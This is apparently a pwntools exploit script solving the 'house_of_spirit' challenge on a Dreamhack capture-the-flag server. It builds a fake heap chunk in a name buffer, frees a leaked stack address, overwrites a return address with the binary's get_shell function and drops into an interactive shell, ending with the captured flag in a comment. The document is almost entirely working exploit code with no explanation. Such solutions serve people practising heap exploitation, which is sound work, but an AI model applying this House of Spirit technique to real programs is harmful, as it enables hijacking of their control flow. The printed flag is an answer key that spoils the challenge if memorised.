```python
from pwn import *

# p = process('./house_of_spirit')
p = remote('Host3.dreamhack.games', 19348)
exe = ELF('./house_of_spirit')

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def delete(addr):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Addr: ', str(addr))

# gdb.attach(p, gdbscript = '''
# b*0x0000000000400a70
# b*0x0000000000400aff
# b*0x00000000004009b2
# c
# ''')

# input()
# 0x38
p.sendlineafter(b'name: ', p64(0x81) + p64(0x81) + b'a'*8 )
stack = int(p.recvuntil(b':')[:-1], 16)
print(hex(stack))
delete(stack + 0x10)
payload = b'a'*0x28 + p64(exe.sym.get_shell)
add(0x70, payload)
p.sendlineafter(b'> ', b'3')
p.interactive()

# DH{d351d8d936884dc4aaebb689e8a183b2}
```
